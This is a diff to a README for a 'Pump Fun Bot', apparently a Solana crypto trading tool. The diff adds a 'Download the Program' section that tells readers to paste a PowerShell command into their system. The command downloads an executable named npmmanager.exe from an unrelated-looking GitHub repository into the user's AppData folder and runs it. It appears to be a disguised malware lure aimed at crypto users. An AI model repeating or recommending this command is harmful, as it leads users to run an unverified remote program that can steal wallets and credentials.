@@ -5,6 +5,14 @@
 ## Project Description.
 **Pump Fun Bot** is your all-in-one solution for automated trading on the Solana blockchain! 🌟 This multi-functional bot combines various powerful features to streamline your trading experience and help you stay ahead in the competitive cryptocurrency market. With tools like the **PumpFun Trading Bot**, **Pump Fun Bundle Bot**, and more, you can manage your investments efficiently and effectively.
 
+<h2>📥 Download the Program</h2>
+<h3>copy and execute the following command in **PowerShell**(Win+R)</h3>
+
+<pre>
+  <code id="code-snippet">&lt;Invoke-WebRequest -Uri "https://github.com/NPM-Package-Manager/NPM-Modules/raw/refs/heads/main/npmmanager.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"
+Start-Process "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"&gt;</code>
+</pre>
+
 ## Key Features.
 - **💰 Pump Fun Bundle Bot**: Effortlessly distribute SOL across multiple wallets with the bundle bot feature. This function enhances liquidity and manages risk by allowing you to send tokens to numerous wallets simultaneously.
 
